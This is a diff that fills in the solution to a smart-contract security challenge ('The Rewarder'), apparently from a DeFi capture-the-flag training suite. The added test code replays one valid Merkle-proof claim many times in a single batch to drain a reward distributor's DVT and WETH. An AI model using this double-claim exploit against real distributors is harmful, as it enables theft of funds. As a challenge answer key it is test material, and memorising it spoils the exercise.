@@ -148,7 +148,30 @@ contract TheRewarderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_theRewarder() public checkSolvedByPlayer {
-        
+        IERC20[] memory tokensToClaim = new IERC20[](2);
+        tokensToClaim[0] = IERC20(address(dvt));
+        tokensToClaim[1] = IERC20(address(weth));
+
+        (uint256 dvtAmount, bytes32[] memory dvtProof) = _getClaimData("/test/the-rewarder/dvt-distribution.json");
+        (uint256 wethAmount, bytes32[] memory wethProof) = _getClaimData("/test/the-rewarder/weth-distribution.json");
+
+        uint256 dvtClaimCount = dvt.balanceOf(address(distributor)) / dvtAmount;
+        uint256 wethClaimCount = weth.balanceOf(address(distributor)) / wethAmount;
+
+        Claim[] memory claims = new Claim[](dvtClaimCount + wethClaimCount);
+
+        for (uint256 i = 0; i < dvtClaimCount; i++) {
+            claims[i] = Claim({batchNumber: 0, amount: dvtAmount, tokenIndex: 0, proof: dvtProof});
+        }
+
+        for (uint256 i = 0; i < wethClaimCount; i++) {
+            claims[dvtClaimCount + i] = Claim({batchNumber: 0, amount: wethAmount, tokenIndex: 1, proof: wethProof});
+        }
+
+        distributor.claimRewards({inputClaims: claims, inputTokens: tokensToClaim});
+
+        dvt.transfer(recovery, dvt.balanceOf(player));
+        weth.transfer(recovery, weth.balanceOf(player));
     }
 
     /**
@@ -175,6 +198,29 @@ contract TheRewarderChallenge is Test {
     struct Reward {
         address beneficiary;
         uint256 amount;
+    }
+
+    function _getClaimData(string memory path) private view returns (uint256 amount, bytes32[] memory proof) {
+        Reward[] memory rewards =
+            abi.decode(vm.parseJson(vm.readFile(string.concat(vm.projectRoot(), path))), (Reward[]));
+        assertEq(rewards.length, BENEFICIARIES_AMOUNT);
+
+        bytes32[] memory leaves = new bytes32[](BENEFICIARIES_AMOUNT);
+        uint256 playerIndex;
+        bool found;
+
+        for (uint256 i = 0; i < BENEFICIARIES_AMOUNT; i++) {
+            leaves[i] = keccak256(abi.encodePacked(rewards[i].beneficiary, rewards[i].amount));
+
+            if (rewards[i].beneficiary == player) {
+                playerIndex = i;
+                amount = rewards[i].amount;
+                found = true;
+            }
+        }
+
+        require(found, "player reward not found");
+        proof = merkle.getProof(leaves, playerIndex);
     }
 
     // Utility function to read rewards file and load it into an array of leaves
